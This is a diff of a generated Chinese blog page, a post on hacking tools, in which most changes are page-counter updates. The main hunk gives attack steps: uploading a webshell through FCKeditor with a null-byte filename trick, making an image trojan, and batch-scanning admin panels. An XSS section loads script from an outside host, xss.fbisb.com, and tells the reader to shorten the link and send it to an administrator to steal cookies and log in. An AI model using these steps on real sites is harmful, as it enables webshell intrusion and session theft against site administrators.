@@ -103,7 +103,7 @@
 <meta property="og:site_name" content="王小建">
 <meta property="og:description" content="你渴不渴？不渴吗？我不管，你肯定渴了   漏洞注入，免杀木马">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-20T02:38:17.369Z">
+<meta property="og:updated_time" content="2018-03-20T02:47:06.486Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网络安全之工具篇">
 <meta name="twitter:description" content="你渴不渴？不渴吗？我不管，你肯定渴了   漏洞注入，免杀木马">
@@ -435,7 +435,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  867
+                  883
                 </span>
               
 
@@ -486,8 +486,7 @@
 <p><a href="http://192.168.1.3:8001/fckeditor" target="_blank" rel="noopener">http://192.168.1.3:8001/fckeditor</a>   若403则表明存在fckeditor<br><a href="http://192.168.1.3:8001/FCKeditor/_whatsnew.html" target="_blank" rel="noopener">http://192.168.1.3:8001/FCKeditor/_whatsnew.html</a>    查看版本<br>FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp<br>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=zhang&amp;CurrentFolder=/<br>第一个页面是在网站根目录下的userfiles目录下的Image目录下打开一个上传页面，上传的文件都保存在这个目录下；第二是在网站根目录下的userfiles目录下创建一个zhang目录。<br>打开<a href="http://192.168.1.3:8001/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp" target="_blank" rel="noopener">http://192.168.1.3:8001/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</a><br>上传1.asp一句话，将2.asp改为2.asp.jpg利用burp截断，修改hex下的2e为00，raw模式，forward发送请求</p>
 <p>copy pic.jpg/b+lubr.php/a piclubr.jpg         图片马,并将文件名改为piclubr.jpg.php上传</p>
 <p>搜索url采集软件：上传关键字，获取所有url，取domain，过滤重复项，右键导出<br>御剑1.5批量扫描后台：外部导入域名列表，双击操作添加upload.txt,可能包含上传的页面扫描<br>一句话木马+菜刀上传</p>
-<h1 id="xss测试"><a href="#xss测试" class="headerlink" title="xss测试"></a>xss测试</h1><p>找到输入框<script>alert(document.cookie)</script>若可以搜索，则存在注入<br>复制<script src="http://xss.fbisb.com/YZ5E"></script>到该网站url中的search后回车<br><a href="http://xss.fbisb.com/" target="_blank" rel="noopener">http://xss.fbisb.com/</a>    显示通讯成功，将上面地址短域名后发给管理员，点开获取cookie，打开菜刀，指定后台页面，右键扩展功能，修改cookie则可登录</p>
-
+<h1 id="xss测试"><a href="#xss测试" class="headerlink" title="xss测试"></a>xss测试</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找到输入框&lt;script&gt;alert(document.cookie)&lt;/script&gt;若可以搜索，则存在注入</span><br><span class="line">复制&lt;sCRiPt sRC=http://xss.fbisb.com/YZ5E&gt;&lt;/sCrIpT&gt;到该网站url中的search后回车</span><br><span class="line">http://xss.fbisb.com/	显示通讯成功，将上面地址短域名后发给管理员，点开获取cookie，打开菜刀，指定后台页面，右键扩展功能，修改cookie则可登录</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -724,7 +723,7 @@ var jiathis_config={
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -735,7 +734,7 @@ var jiathis_config={
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -746,7 +745,7 @@ var jiathis_config={
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -837,7 +836,7 @@ var jiathis_config={
   <span class="author" itemprop="copyrightHolder">AsherCode</span>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共87.0k字</span>
+  <span class="post-count">博客全站共101.6k字</span>
 </div>
   
 </div>
